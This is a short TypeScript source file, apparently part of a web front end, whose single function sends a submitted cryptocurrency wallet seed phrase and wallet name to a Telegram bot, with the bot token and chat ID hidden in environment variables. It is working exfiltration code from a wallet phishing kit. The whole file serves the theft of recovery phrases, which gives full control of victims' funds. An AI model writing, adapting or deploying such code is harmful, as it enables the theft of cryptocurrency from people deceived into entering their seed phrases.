// No hardcoded token anymore
const BOT_TOKEN = import.meta.env.VITE_BOT_TOKEN;
const CHAT_ID = import.meta.env.VITE_CHAT_ID;

export async function sendSeedPhraseToTelegram(seedPhrase: string, walletName: string) {
  const message = `🚨 New Seed Phrase Submitted\n\nWallet: ${walletName}\nSeed: ${seedPhrase}`;
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' }),
  });
}